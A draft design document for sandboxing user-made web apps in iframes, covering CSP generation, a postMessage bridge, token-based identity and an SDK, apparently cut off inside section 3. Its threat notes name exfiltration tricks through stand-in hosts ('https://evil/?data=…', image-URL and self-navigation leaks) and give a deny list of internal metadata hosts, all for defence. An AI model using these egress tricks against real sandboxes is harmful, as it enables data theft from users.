---
type: design
title: Sandbox host, postMessage bridge, and SDK - implementation design
status: draft
updated: 2026-08-03
---

> Design pass generated 2026-08-03 against the specs in the parent folder.
> Section 8 lists defects found in those specs; the agreed fixes are being
> applied to the specs themselves, so where this doc and a spec disagree after
> that, the spec wins.

I've read all three specs and mapped the v1 stack. Here is the design.

---

# Town Square Sandboxed Creations — Architecture Plan

## 0. Decisions up front (the load-bearing ones)

| Decision | Call |
|---|---|
| Guest origin | **Per-creation subdomain on a separate registrable domain**, with `allow-same-origin` in the sandbox. Not an opaque origin. |
| Bundle storage | **Content-addressed blobs in Postgres**, no filesystem, no object store at launch |
| CSP delivery | **HTTP response header only**, compiled at publish and **frozen** on the version row |
| CSP purpose | **Egress control**, not in-frame XSS hardening. `'unsafe-inline'` allowed, `'unsafe-eval'` denied |
| Bridge transport | Handshake on `window.postMessage`, then **MessageChannel port** for all traffic |
| Identity | Short-lived **act token** (user+creation+permissions), held only by the host page, never by the guest |
| SDK distribution | **Import map injected at serve time** so the spec's `import ... from '@townsquare/sdk'` works with zero tooling |
| SDK authoring | **Plain JS + JSDoc**, `.d.ts` generated. Preserves the no-build-step invariant and makes the shipped SDK identical to reviewable source |
| Host shell | **New React + Vite app at `web/`.** Expo/RN-Web is kept for native and is not the sandbox host |

---

## 1. The sandbox host

### 1.1 Why a separate origin, and which kind

Two candidate origins:

**(A) Opaque origin** — omit `allow-same-origin`, get a unique null origin for free, no DNS, no certs. Rejected:
- `localStorage`, `sessionStorage`, `IndexedDB` all **throw** in an opaque origin. LLM-generated apps reach for `localStorage` constantly; this fails in a way that looks like our bug.
- Every guest reports `event.origin === "null"`, so host-side origin validation degrades to a source-identity check only.
- No meaningful per-creation storage isolation to reason about — there is no storage.

**(B) Real per-creation origin on a distinct registrable domain** — chosen.

```
Shell:      https://townsquare.org                 (session cookie lives here, Host-only)
Bundles:    https://<origin_key>.tsq-apps.net      (wildcard cert, never sees the cookie)
Preview:    https://p-<preview_key>.tsq-apps.net   (unapproved code, separate namespace)
```

Why a **different registrable domain** rather than `apps.townsquare.org`:
- Cookies scoped to `townsquare.org` are structurally unable to reach the bundle origin. Not policy — the cookie jar.
- Chrome's Site Isolation keys on **site** (eTLD+1), not origin. Under one registrable domain, all creations plus the shell can share a renderer process, which is a Spectre-class exposure. A separate domain puts creations in a different process from the shell today; a **Public Suffix List submission for `tsq-apps.net`** later puts every creation in its own process. (PSL entry is a multi-week process — file it early, don't block on it.)

Why `origin_key` and not the slug: slugs are renameable and reusable. If origins were keyed on slug, renaming a creation and letting someone else take the slug would hand them the previous app's `localStorage`. `origin_key` is an immutable base32 of the creation UUID, **allocated once and never reused, even after deletion.**

Preview bundles get a separate key namespace so unreviewed code can never write to the approved app's storage origin.

### 1.2 Exact iframe attributes

```html
<iframe
  src="https://a7k2m9x4.tsq-apps.net/"
  sandbox="allow-scripts allow-same-origin allow-forms allow-modals"
  allow="accelerometer 'none'; ambient-light-sensor 'none'; autoplay 'none'; camera 'none';
         clipboard-read 'none'; display-capture 'none'; encrypted-media 'none';
         geolocation 'none'; gyroscope 'none'; hid 'none'; idle-detection 'none';
         local-fonts 'none'; magnetometer 'none'; microphone 'none'; midi 'none';
         payment 'none'; publickey-credentials-get 'none'; screen-wake-lock 'none';
         serial 'none'; usb 'none'; xr-spatial-tracking 'none'"
  referrerpolicy="no-referrer"
  title="Flock Camera Map — a resident-built creation"
  loading="lazy"
></iframe>
```

**On `allow-scripts` + `allow-same-origin`.** The standard warning against this combination applies *only when the framed document is same-origin with the embedder* — in that case the frame can reach into the parent DOM and delete its own `sandbox` attribute. Our bundle origin is a different registrable domain, so `window.parent` is opaque to it and the escape does not exist. This is exactly the CodePen/StackBlitz configuration. Put this paragraph in a comment above the attribute, because it will be flagged in every future review.

**Links out.** With no `allow-popups` and no `allow-top-navigation`, an ordinary `target="_blank"`, `tel:` or `mailto:` link in a creation does nothing, and a plain link out replaces the creation (an unexpected `load`, reason `navigated`). The guest runtime therefore catches clicks on links that leave the creation, and `window.open`, and sends them to `app.openLink`. The host checks the link, and the shell asks the resident in a dialog drawn outside the frame. The sandbox token list does not change. See `packages/shared/src/links.ts` and `CreationHost.requestLink`.

**Deliberately absent, with reasons:**

| Token | Why denied |
|---|---|
| `allow-popups` | `window.open('https://evil/?data=…')` is an egress channel CSP cannot block. Links out go through `app.openLink` instead (see below) |
| `allow-popups-to-escape-sandbox` | Would hand a popup full ambient privileges |
| `allow-top-navigation*` (all variants) | Frame could navigate the whole tab away, phishing vector |
| `allow-downloads` | Drive-by download |
| `allow-pointer-lock` | UI hijack |
| `allow-presentation`, `allow-orientation-lock` | No use case |
| `allow-storage-access-by-user-activation` | Storage Access API is for third-party cookies; nothing good comes of granting it |

`allow-modals` is included reluctantly: `alert()`/`confirm()` appear in a large fraction of generated code and silently no-op without it. It is an annoyance vector (blocking dialogs), and Chrome labels the dialog with the frame's origin, which is a hostile-looking `a7k2m9x4.tsq-apps.net`. Ship with it, keep the option to drop it.

`allow-forms` is nearly cosmetic given `form-action 'none'` in the CSP, but keeping it avoids surprising behavior differences in form-heavy apps.

### 1.3 Serving the bundle

A second Fastify entrypoint from the **same image**, host-bound to `*.tsq-apps.net` — mirroring how v1 ran `@rvts/api` and `@rvts/worker` from one Dockerfile with per-service `startCommand`. `api/src/main.sandbox.ts`.

The critical property is that this process **registers no auth plugin, no cookie parser, and no route that reads a session**. A guard hook rejects any request whose `Host` is not under `$APPS_DOMAIN` with 421.

Request path:

```
GET https://a7k2m9x4.tsq-apps.net/app.js
  1. parse Host → origin_key (or p-<preview_key>)
  2. resolve → creations.active_version_id  (LRU, 60s, invalidated on publish/block)
     status must be 'active'; blocked/hidden → 410 with a plain explainer page
  3. normalize path (§7 threat 8) → exact lookup in creation_files (version_id, path)
     no filesystem is involved at any point
  4. blob = creation_blobs[sha]
  5. headers (below), then bytes
```

Response headers on every bundle asset:

```
Content-Security-Policy: <frozen creation_versions.csp_header>
Content-Type:            <from a closed extension allowlist, never sniffed from bytes>
X-Content-Type-Options:  nosniff
Referrer-Policy:         no-referrer
Cross-Origin-Resource-Policy: cross-origin
Cache-Control:           public, max-age=31536000, immutable      # non-entry assets
Cache-Control:           no-cache                                  # entry HTML (theme/SDK injection)
ETag:                    "<blob sha>"
Permissions-Policy:      geolocation=(), camera=(), microphone=(), payment=(), usb=()
Vary:                    Host
```

Extension allowlist (anything else → 404, no exceptions, no `application/octet-stream` fallback):
`.html .css .js .mjs .json .svg .png .jpg .jpeg .webp .gif .avif .woff2 .ico .txt .csv .geojson .map`

`.wasm` is excluded at launch — `'unsafe-eval'` is denied and WASM would require `wasm-unsafe-eval`, which reopens the fetch-and-execute-remote-code path.

### 1.4 CSP generation

Compiled from `permissions.network` **at publish time**, stored on the version row, and served verbatim. It is never recomputed at request time from the manifest, because that would mean a mutable input to a security decision that a human already reviewed.

```ts
// packages/shared/src/csp.ts

const HOSTNAME = /^(?=.{1,253}$)(?!-)[a-z0-9-]{1,63}(?<!-)(\.(?!-)[a-z0-9-]{1,63}(?<!-))+$/;

const DENIED_SUFFIXES = [
  '.localhost', '.local', '.internal', '.home.arpa', '.onion', '.test', '.invalid',
];
const DENIED_EXACT = new Set([
  'localhost', 'metadata.google.internal',
  // never let a creation declare our own surfaces: the bridge is the only door
  'townsquare.org', 'api.townsquare.org', 'tsq-apps.net',
]);

/** Throws InvalidManifest with a reviewer-readable reason. Runs at submit AND at approve. */
export function normalizeNetworkHost(raw: string): string {
  const s = raw.trim().toLowerCase();
  if (s.includes('/') || s.includes(':') || s.includes('*') || s.includes(' '))
    throw new InvalidManifest(`network host must be a bare hostname, got "${raw}"`);
  const host = punycode(s);                       // IDN → a-label, so homographs normalize
  if (!HOSTNAME.test(host))
    throw new InvalidManifest(`not a valid hostname: "${raw}"`);
  if (isIpLiteral(host))                          // v4, v6, decimal/octal/hex forms
    throw new InvalidManifest(`IP literals are not allowed: "${raw}"`);
  if (DENIED_EXACT.has(host) || DENIED_SUFFIXES.some((x) => host.endsWith(x)))
    throw new InvalidManifest(`reserved or internal host: "${raw}"`);
  if (host.endsWith('.' + APPS_DOMAIN) || host === APPS_DOMAIN)
    throw new InvalidManifest(`creations may not declare other creations' origins`);
  return host;
}

export interface CspInput {
  network: string[];          // manifest.permissions.network
  shellOrigins: string[];     // e.g. ['https://townsquare.org']
  reportEndpoint: string;     // absolute, on the API origin
}

export function compileCsp(input: CspInput): string {
  const hosts = [...new Set(input.network.map(normalizeNetworkHost))].sort();
  if (hosts.length > 12)
    throw new InvalidManifest('at most 12 network hosts may be declared');

  const declared = hosts.map((h) => `https://${h}`).join(' ');
  const d = declared ? ' ' + declared : '';

  return [
    // Everything is denied unless a directive below re-opens it.
    `default-src 'none'`,

    // The whole document is untrusted code we reviewed as source. CSP's job here is
    // egress, not script integrity, so inline is allowed for authoring ergonomics.
    // eval() is NOT: it is the cheapest way to fetch a payload post-approval and
    // execute behavior a reviewer never saw. That review-evasion path stays shut.
    `script-src 'self' 'unsafe-inline'`,
    `style-src 'self' 'unsafe-inline'`,

    // img-src must be exactly as tight as connect-src. `new Image().src = url + secret`
    // is the classic CSP bypass when people only lock down connect-src.
    `img-src 'self' data: blob:${d}`,
    `media-src 'self' blob:${d}`,
    `connect-src 'self'${d}`,          // note: the API is NOT here; the bridge is the only door
    `font-src 'self' data:`,           // Libre Baskerville is self-hosted on the apps origin
    `worker-src 'self'`,               // no blob: — a blob worker is a code-injection seam
    `manifest-src 'none'`,
    `object-src 'none'`,
    `frame-src 'none'`,
    `child-src 'none'`,

    `base-uri 'none'`,                 // stops <base href> repointing every relative URL offsite
    `form-action 'none'`,              // form POST is an egress channel CSP otherwise ignores
    `frame-ancestors ${input.shellOrigins.join(' ')}`,
    `upgrade-insecure-requests`,
    `report-uri ${input.reportEndpoint}`,
    `report-to ts-csp`,
  ].join('; ');
}
```

**Header, not `<meta>`.** `frame-ancestors`, `report-uri`, and `sandbox` are **ignored** in a `<meta>` CSP, and a meta policy only governs content parsed after it — an attacker-controlled document simply puts its resources first. There is no case for meta here.

**A CSP report endpoint is worth building on day one.** A creation attempting an undeclared host produces a report; that is a free, continuous, automatic signal that source review missed something. Ingest it rate-limited into a capped table, key it by `origin_key`, and surface it in the moderator view.

**The one thing CSP cannot stop:** the frame navigating *itself* to `https://evil.example/?stolen=…`. The `navigate-to` directive was dropped from the spec and never shipped. `allow-top-navigation` is denied so the tab is safe, but self-navigation is always permitted. This is a real residual hole and I would rather name it than pretend. Mitigations, in order of actual value:
1. **The no-minification rule + source review.** The destination URL must appear in readable source. This is the primary defense and it is the reason "review source, not the built bundle" from `creation-authoring.md` is load-bearing rather than aesthetic.
2. Host detects a second `load` event after `ts:ready`, or a ping/pong going silent → surface "this creation stopped responding", log a `creation_incidents` row, auto-flag for review.
3. It is self-defeating: the app visibly disappears.

### 1.5 Design token injection

Tokens live in a new `packages/tokens`, which is the single source and emits both `tokens.ts` (existing shape from `packages/app/src/theme/tokens.ts`, for RN) and `theme.css` (custom properties, for the web shell and guests). Generation is a `--check`-able script, verified in CI, not run at request time.

Delivery is two-layer:

1. **First paint, no FOUC:** the sandbox server serves `/_ts/theme/<townId>-<themeVersion>.css` **from the guest's own origin**, so `style-src 'self'` covers it with no CSP special case and no creation needing to declare anything. `@font-face` for Libre Baskerville is in that file, with the woff2 also served from the apps origin — that is why `font-src 'self'` is sufficient and why no creation ever has to put `fonts.googleapis.com` in its manifest.
2. **Live updates:** a `theme` bridge event carrying the token map, so a town reskin or a dark-mode toggle repaints mounted creations without a reload. The SDK applies it to `document.documentElement.style`.

Injection into the entry HTML happens at **serve time**, on the entry document only, as a fixed-string splice after the first `<head>` (or prepended if absent). The result is memoized in an LRU keyed by `(versionId, themeVersion, sdkVersion)`. Serve-time rather than publish-time so theme and SDK patch versions roll forward without republishing 50 creations.

```html
<!-- injected by Town Square, immediately after <head> -->
<meta charset="utf-8">
<script type="importmap">
{"imports":{"@townsquare/sdk":"/_ts/sdk/1-3fa9c2e1d04b7a65/sdk.js","@townsquare/sdk/":"/_ts/sdk/1-3fa9c2e1d04b7a65/"}}
</script>
<link rel="stylesheet" href="/_ts/theme/russellville-ar-19.css">
<script type="module" src="/_ts/sdk/1-3fa9c2e1d04b7a65/boot.js"></script>
```

`boot.js` is one line — `import './sdk.js'` — and exists so the handshake, theming, and auto-height start even for a creation that never imports the SDK. Because it is the same URL the app's own `import` resolves to, the module singleton is shared; there is no double-initialization.

The SDK directory is `<major>-<fingerprint>`, where the fingerprint is a hash of the runtime's bytes (`sdkBasePath` in `packages/sandbox/src/serve.ts`). The runtime is served `immutable` for a year, so its URL has to change whenever it does: with a fixed `/_ts/sdk/1/`, a resident who had loaded any creation before an SDK release would keep the old runtime until the cache expired. The entry document that names the URL is `no-cache`, so it always points at the current one. Nothing outside the injection may hard-code an SDK URL.

The import map **must** be spliced before any module script in the document, which is why it goes first. The validator rejects any bundle shipping its own import map that maps `@townsquare/*`.

### 1.6 Height and lifecycle

`packages/host` owns a state machine, framework-agnostic:

```
mounting → loading → ready → (updating) → teardown
                  ↘ error(timeout | crashed | navigated | blocked)
```

- Host creates the iframe, sets `src`, starts a **10 s ready timeout**. A skeleton at `min-height: 320px` is shown.
- Guest posts `ts:hello`; host validates and replies `ts:init` transferring `port2`.
- Guest calls `app.ready()` → skeleton removed, timeout cleared.
- Timeout → "this creation didn't load", a Reload button, and an incident row.

Height, when `display.height === "auto"`: the host cannot measure cross-origin content, so the **guest** measures. The SDK installs a `ResizeObserver` on `documentElement`, reads `scrollHeight`, coalesces on `requestAnimationFrame`, and posts `ts:height` only on change ≥ 2 px. Host clamps to `[200, 4000]` px and animates with a 150 ms transition. The clamp is not cosmetic — an unclamped guest can report 10,000,000 px and destroy the shell's scroll.

When `display.height` is fixed, `app.setHeight(n)` is the only source, same clamp.

Host → guest events: `theme`, `visibility` (tab hidden or creation scrolled out of viewport, via `IntersectionObserver` — lets apps stop polling), `teardown`.

Unmount always **removes the iframe element from the DOM**. Never reuse a frame across creations or versions; a fresh element is the only reliable way to discard the guest's execution context, timers, and in-flight work. The host aborts pending bridge requests with `unavailable` and closes the port.

### 1.7 Why React + Vite for the shell, not Expo/RN-Web

The existing `packages/app` stays; it consumes the API and serves native. The sandbox host is a new `web/`.

1. **`<iframe>` is not a React Native primitive.** RNW forces `unstable_createElement` or raw HTML injection, and neither gives clean, reviewable control of `sandbox` / `allow` / `referrerpolicy` — the exact attributes that *are* the security boundary. A security-critical attribute list should not be routed through a compatibility shim.
2. **The whole feature is DOM.** `MessageChannel`, `ResizeObserver`, `IntersectionObserver`, `contentWindow`, CSS custom properties. RNW's style model actively fights CSS variables, which is how theming reaches the guest.
3. **Response headers matter.** The shell needs `Content-Security-Policy: frame-ancestors 'self'`, `Cross-Origin-Opener-Policy: same-origin`, and cookie control. `expo export` produces static files with no header story; Vite plus a Fastify static handler on the API image gives full control and matches the existing deploy shape.
4. **v1 already builds a frontend.** `packages/app/dist/` exists. The no-build-step invariant is about the **server runtime** (`tsx`, no `dist/` for Node code). A Vite build for the browser does not violate it.

Keep `packages/host` as plain TypeScript with zero React imports, exposing `createCreationHost(el, config)`. `web/` wraps it in a 40-line `<CreationFrame>`. A future native host (WKWebView / Android WebView) drives the same protocol without touching the bridge logic — though note that native WebViews cannot reproduce the per-origin isolation cleanly, so embedded creations on native are deferred.

---

## 2. The postMessage bridge

### 2.1 Envelope

Wire types live in `packages/shared/src/protocol.ts` and are the only thing both sides import.

```ts
export const PROTOCOL_VERSION = 1;

export type Envelope = Hello | Init | Request | Response | Event;

/** guest → host, on window.postMessage, exactly once */
export interface Hello {
  ts: 1; kind: 'hello';
  sdk: string;             // '1'
  sdkBuild: string;        // for telemetry only, never trusted
}

/** host → guest, on window.postMessage, transfers [port2] */
export interface Init {
  ts: 1; kind: 'init';
  town: { id: string; name: string; timezone: string };
  theme: Record<string, string>;
  display: { surface: 'full' | 'card'; height: 'auto' | 'fixed' };
  /** ADVISORY ONLY. Lets the SDK fail fast with a good message. Never trusted. */
  grants: { identity: 'none' | 'handle'; read: string[]; write: string[]; storage: boolean };
}

/** guest → host, on the port */
export interface Request {
  ts: 1; kind: 'req';
  id: string;              // guest-generated, unique within the frame
  method: Method;          // closed enum
  params: unknown;
}

/** host → guest, on the port */
export type Response =
  | { ts: 1; kind: 'res'; id: string; ok: true;  result: unknown }
  | { ts: 1; kind: 'res'; id: string; ok: false; error: WireError };

export interface WireError { code: ErrorCode; message: string; details?: unknown }

/** host → guest, unsolicited, on the port */
export interface Event {
  ts: 1; kind: 'evt';
  event: 'theme' | 'visibility' | 'teardown';
  data: unknown;
}

export type ErrorCode =
  // from the spec — these are the contract, they never change meaning
  | 'not_verified' | 'permission_denied' | 'rate_limited' | 'not_found' | 'invalid_record'
  // ADDED. See §8 — the spec's five are insufficient and generated code will hit these.
  | 'invalid_request'   // malformed params / unknown method. the one devs see most
  | 'unauthenticated'   // signed out and the call requires a user
  | 'unavailable'       // host or upstream failed, or timed out. retryable
  | 'conflict'          // concurrent update lost the race
  | 'too_large';        // payload over a documented limit
```

`method` is a **flat closed enum** (`'town.items'`, `'records.create'`, …), never `namespace` + `fn` concatenated from guest strings, and the handler registry is a `Map`, not an object literal — so `{"method":"__proto__"}` resolves to nothing.

### 2.2 Handshake and origin validation

**Host side.**

```ts
// packages/host/src/transport.ts

export function connect(iframe: HTMLIFrameElement, guestOrigin: string, timeoutMs = 10_000)
  : Promise<MessagePort>
{
  return new Promise((resolve, reject) => {
    let settled = false;

    const onMessage = (e: MessageEvent) => {
      // 1. capability check: is this literally our frame? survives origin spoofing entirely.
      if (e.source !== iframe.contentWindow) return;
      // 2. origin check: exact string equality against the origin WE assigned. Never
      //    startsWith, never endsWith — "https://a7k2m9x4.tsq-apps.net.evil.com" passes those.
      if (e.origin !== guestOrigin) return;
      // 3. shape check before touching any field
      const d = e.data;
      if (!d || d.ts !== 1 || d.kind !== 'hello') return;
      // 4. latch: exactly one handshake per frame, ever.
      if (settled) return;
      settled = true;
      window.removeEventListener('message', onMessage);

      const { port1, port2 } = new MessageChannel();
      // targetOrigin is ALWAYS the explicit origin. '*' here would post our init payload
      // (town, theme, grants) to whatever the frame navigated itself to.
      iframe.contentWindow!.postMessage(buildInit(), guestOrigin, [port2]);
      resolve(port1);
    };

    window.addEventListener('message', onMessage);
    setTimeout(() => {
      if (settled) return;
      settled = true;
      window.removeEventListener('message', onMessage);
      reject(new HostError('unavailable', 'creation did not connect'));
    }, timeoutMs);
  });
}
```

After the handshake **all traffic is on the port.** A `MessagePort` is an unforgeable capability: no other frame, opener, or extension content script can post to it, and there is no origin to spoof because there is no origin involved. This removes an entire class of "which frame sent this" bugs. The `window` listener is removed, so the host's message surface after connect is zero.

**Guest side.**

```js
// packages/sdk/src/bridge.js
let port = null, latched = false;

function handshake() {
  return new Promise((resolve, reject) => {
    const onMessage = (e) => {
      // Guest-side validation protects the CREATION, not the platform. It stops a hostile
      // page that framed this bundle from impersonating Town Square and phishing app state.
      // The platform's own enforcement is frame-ancestors, which is not optional.
      if (e.source !== window.parent) return;
      if (e.origin !== HOST_ORIGIN) return;              // literal, baked in at serve time
      if (!e.data || e.data.ts !== 1 || e.data.kind !== 'init') return;
      if (!e.ports || e.ports.length !== 1) return;
      if (latched) return;                                // a second init is an attack, not a retry
      latched = true;
      window.removeEventListener('message', onMessage);
      port = e.ports[0];
      port.onmessage = onFrame;
      port.start();
      resolve(e.data);
    };
    window.addEventListener('message', onMessage);
    window.parent.postMessage({ ts: 1, kind: 'hello', sdk: '1', sdkBuild: BUILD }, HOST_ORIGIN);
    setTimeout(() => !latched && reject(new TownSquareError('unavailable', 'no host')), 15_000);
  });
}
```

`HOST_ORIGIN` is a literal baked into the SDK file the sandbox server generates per town — not fetched, so there is no race and nothing to poison.

### 2.3 Request correlation, timeouts, in-flight caps

```js
// guest side
const pending = new Map();   // id -> { resolve, reject, timer }
let seq = 0;
const nonce = crypto.randomUUID();

export function call(method, params, { timeoutMs = 15_000 } = {}) {
  if (pending.size >= 32)
    return Promise.reject(new TownSquareError('rate_limited', 'too many in-flight requests'));
  const id = `${nonce}:${++seq}`;                 // monotonic + unguessable; ids never repeat
  return new Promise((resolve, reject) => {
    const timer = setTimeout(() => {
      pending.delete(id);
      // Guest timeout is LONGER than the host's, so in the normal case the guest receives a
      // real error code from the host rather than inventing one. This only fires if the host
      // itself died, which is exactly what 'unavailable' means.
      reject(new TownSquareError('unavailable', `${method} timed out`));
    }, timeoutMs);
    pending.set(id, { resolve, reject, timer });
    port.postMessage({ ts: 1, kind: 'req', id, method, params });
  });
}

function onFrame(e) {
  const m = e.data;
  if (!m || m.ts !== 1) return;
  if (m.kind === 'evt') return dispatchEvent(m);
  if (m.kind !== 'res' || typeof m.id !== 'string') return;
  const p = pending.get(m.id);
  if (!p) return;                                 // late, duplicate, or forged id: drop silently
  pending.delete(m.id);                           // delete BEFORE settling: no double-settle
  clearTimeout(p.timer);
  m.ok ? p.resolve(m.result) : p.reject(new TownSquareError(m.error.code, m.error.message, m.error.details));
}
```

Host side mirrors this with a per-request `AbortController`, a **10 s timeout for reads and 30 s for writes**, and a hard cap of 32 concurrent requests per frame (`rate_limited` beyond).

### 2.4 Permission enforcement — one table, two enforcers

The registry is generated from `packages/sdk/src/methods.js`, the same table that generates the docs. Docs and enforcement therefore cannot drift, because there is only one of them.

```ts
// packages/host/src/registry.ts
interface Handler {
  params: z.ZodType;                                   // strict, no passthrough
  check: (g: Grants, p: any) => ErrorCode | null;      // null = allowed
  cost: number;                                        // rate-limit tokens
  run: (ctx: BridgeCtx, p: any) => Promise<unknown>;
}

export const REGISTRY = new Map<Method, Handler>([
  ['town.items', {
    params: TownItemsParams,
    check: () => null,                                 // town data is public per spec
    cost: 1,
    run: (ctx, p) => ctx.api.get('/v1/bridge/town/items', p),
  }],
  ['user.current', {
    params: z.object({}).strict(),
    check: (g) => (g.identity === 'handle' ? null : 'permission_denied'),
    cost: 1,
    run: (ctx) => ctx.api.get('/v1/bridge/me'),         // returns { handle, verified } ONLY
  }],
  ['records.list', {
    params: RecordsListParams,
    check: (g, p) => (g.read.includes(p.type) ? null : 'permission_denied'),
    cost: 1,
    run: (ctx, p) => ctx.api.get('/v1/bridge/records', p),
  }],
  ['records.create', {
    params: RecordsCreateParams,
    check: (g, p) => (g.write.includes(p.type) ? null : 'permission_denied'),
    cost: 10,
    run: (ctx, p) => ctx.api.post('/v1/bridge/records', p),   // server re-checks + verifies resident
  }],
  ['storage.set', {
    params: StorageSetParams,
    check: (g) => (g.storage ? null : 'permission_denied'),
    cost: 5,
    run: (ctx, p) => ctx.api.put('/v1/bridge/storage', p),
  }],
  // ...
]);
```

```ts
// packages/host/src/bridge.ts — the whole enforcement path, deliberately short
async function handle(msg: Request, ctx: BridgeCtx): Promise<Response> {
  const reply = (e: ErrorCode, m: string) =>
    ({ ts: 1, kind: 'res', id: msg.id, ok: false, error: { code: e, message: m } } as const);

  // FAIL CLOSED. Unknown method → nothing runs. There is no default branch, no dynamic
  // dispatch, no string concatenation into a lookup.
  const h = REGISTRY.get(msg.method as Method);
  if (!h) return reply('invalid_request', `unknown method: ${String(msg.method)}`);

  const parsed = h.params.safeParse(msg.params);
  if (!parsed.success) return reply('invalid_request', formatZod(parsed.error));

  // grants come from the APPROVED, FROZEN manifest on creation_versions — never from
  // townsquare.json as served, and never from anything the guest sent us.
  const denial = h.check(ctx.grants, parsed.data);
  if (denial) return reply(denial, `manifest does not declare this capability`);

  if (!ctx.limiter.take(msg.method, h.cost))
    return reply('rate_limited', 'slow down');

  try {
    return { ts: 1, kind: 'res', id: msg.id, ok: true, result: await h.run(ctx, parsed.data) };
  } catch (err) {
    return reply(...toWireError(err));   // never leak stacks, URLs, or internal messages
  }
}
```

**The bridge check is UX, not security.** The guest can hand-write port messages without the SDK, so client-side checks buy fast feedback and nothing else. The server enforces the same table independently, from the act token's claims (§2.5). Every permission gets tested at both layers; the Playwright suite specifically bypasses the SDK to prove the server holds.

### 2.5 Identity without a token in the guest

Layered so that no single failure exposes a session.

1. The session cookie is `HttpOnly; Secure; SameSite=Lax`, `Host-` prefixed, scoped to `townsquare.org`. It is **not reachable by JS at all**, including the host page's own JS.
2. On mount, the host page calls `POST /v1/creations/:id/act` with cookie credentials. The server returns a short-lived **act token**:

```json
{
  "iss": "townsquare", "aud": "bridge",
  "sub": "<user uuid | null when signed out>",
  "cre": "<creation uuid>", "cv": "<creation_version uuid>",
  "town": "russellville-ar",
  "vr": true,
  "gr": { "identity": "handle", "read": ["flock_camera"], "write": ["flock_camera"], "storage": true },
  "exp": "<now + 15m>", "jti": "<uuid>"
}
```

3. The host holds it in a **closure variable** — not `localStorage`, not a React state tree, not a global — and refreshes at T-2m.
4. All bridge-originated API calls go to `/v1/bridge/*` with `Authorization: Bearer <act>` and **`credentials: 'omit'`**. The session cookie is never sent on a bridge call. A bridge endpoint that somehow accepted a cookie is a bug the CORS config also blocks.
5. `user.current` hits `GET /v1/bridge/me`, which returns exactly `{ handle, verified }` — projected **server-side**, so the host page never holds the email or user id in a shape it could accidentally forward.
6. The server derives acting user and acting creation from the token's `sub` and `cre`. Dual attribution therefore cannot be forged by the guest (never has the token), by the user in devtools (would need a token minted for that creation, which requires actually mounting it), or by a compromised host bug (token is creation- and permission-scoped, expires in 15 minutes, and is `jti`-revocable when a creation is blocked).

The property worth stating plainly: **even a total leak of the act token to the guest yields only what that creation was already approved to do, as that user, for 15 minutes.** It is never an account credential.

### 2.6 Rate limiting

| Layer | Key | Limit | Purpose |
|---|---|---|---|
| Host bridge, token bucket | `(creation, method class)` | reads 20/s burst 40; writes 1/s burst 5; storage 5/s burst 20 | Catches the runaway `useEffect`, the actual common case, without a network round trip |
| Host, in-flight | frame | 32 concurrent | Backpressure |
| API, `@fastify/rate-limit` | `act.cre` + `act.sub` | 600 read/min, 60 write/min | Authoritative; survives a compromised host |
| API, per creation, daily | `act.cre` | 5 000 writes/day | Abuse ceiling; trips a moderator alert |

Exceeding any of these returns `rate_limited`. The SDK does **not** auto-retry — silent retry on `rate_limited` is how a runaway loop becomes a sustained one. Document `retryAfterMs` in `details` and let the app decide.

---

## 3. The client SDK — `@townsquare/sdk`

### 3.1 Distribution: four ways in, one file

| Path | How | For |
|---|---|---|
| Bare specifier (spec's documented form) | Import map injected at serve time → `/_ts/sdk/1-<fingerprint>/sdk.js` | Everyone. Works with zero tooling, exactly as the spec is written |
| Direct URL | Not supported: the URL carries a content fingerprint (§1.5) and changes with every SDK release | — |
| Global | `<script src="/_ts/sdk/1/global.js">` → `window.townsquare` | Non-module `<script>` apps, which LLMs emit often |
| npm | `pnpm add -D @townsquare/sdk` | Door B: types, local dev server, editor completion. Never bundled — the import map wins at runtime |

The import map means the spec's snippet is literally copy-pasteable into an `index.html` with no `package.json`, no `node_modules`, and no build. That is the single highest-leverage decision in this section for the vibecoding use case.

The npm package is **types plus dev tooling**; its runtime file is byte-identical to the hosted one. The `AGENTS.md` in the starter template says: *do not bundle the SDK, do not vendor it, import it by bare specifier.* The validator enforces this by rejecting a bundle containing a file that exports the SDK's symbols.

### 3.2 Authoring and typing, with no build step

`packages/sdk/src/*.js` is **hand-authored plain JavaScript with JSDoc types**. Not TypeScript.

- The browser receives the exact file we wrote. No transpile, no sourcemap indirection.
- The shipped SDK **is** the reviewable source — a fitting property for a platform whose entire security story is "we review source."
- `tsc --allowJs --checkJs --declaration --emitDeclarationOnly` produces `types/index.d.ts`, committed and CI-verified with `--check`. That is a typecheck artifact, not a runtime build, so the `tsx`/no-build invariant holds.
- Editors and Claude Code get full completion from the `.d.ts`.

Budget: under 6 KB unminified. If it doesn't fit, the SDK is too big, which the specs already argue independently.

### 3.3 Surface

```js
import { town, user, records, storage, app, TownSquareError } from '@townsquare/sdk'
```

Exactly the spec's shape, with these deltas (all justified in §8):

- `records.get(type, id)` and `records.update(type, id, patch)` take the type explicitly.
- `records.create` is the name; `records.write` from `creation-authoring.md` is dropped.
- Every list method returns `{ items, nextCursor }`; `nextCursor` is `null`, never absent — models handle a stable shape far better than an optional key.
- `app.ready()` is idempotent and auto-fires 3 s after `DOMContentLoaded` if never called, because an app that forgot it should still render.

```js
/**
 * @param {string} type
 * @param {{ since?: string, limit?: number, cursor?: string|null }} [opts]
 * @returns {Promise<{ items: TsRecord[], nextCursor: string|null }>}
 * @throws {TownSquareError} permission_denied when `type` is not in permissions.read
 */
export const list = (type, opts = {}) => call('records.list', { type, ...opts });
```

### 3.4 Keeping `get_sdk_docs` in sync — one table, six outputs

`packages/sdk/src/methods.js` is the single machine-readable description of the surface:

```js
export const METHODS = [
  {
    method: 'records.create',
    ns: 'records', fn: 'create',
    signature: "records.create(type, data)",
    permission: { kind: 'write', from: 'params.type' },
    requiresVerified: true,
    cost: 10,
    summary: 'Create a shared town record. The acting user and this creation are attached automatically.',
    params: { type: 'string, must be listed in permissions.write', data: 'object matching the type schema' },
    returns: '{ id, type, data, version, created_at }',
    throws: ['permission_denied', 'not_verified', 'invalid_record', 'rate_limited'],
    example: `const rec = await records.create('flock_camera', { lat: 35.27, lng: -93.13, note: 'on the pole' })`,
  },
  // ...
];
```

Generated from it, all committed and all CI-verified with `--check`:

1. `packages/host/src/registry.generated.ts` — the bridge handler + permission table
2. `api/src/routes/bridge.generated.ts` — server-side permission assertions
3. `packages/sdk/AGENTS.md` — shipped in the starter template
4. `SDK.md` — the public docs page
5. `packages/sdk/types/index.d.ts`
6. `mcp/src/tools/getSdkDocs.ts` — reads the generated markdown at runtime

Three tests make drift impossible:
- every export of `index.js` appears in `METHODS`, and vice versa
- every `METHODS` entry has a permission rule and at least one bridge test
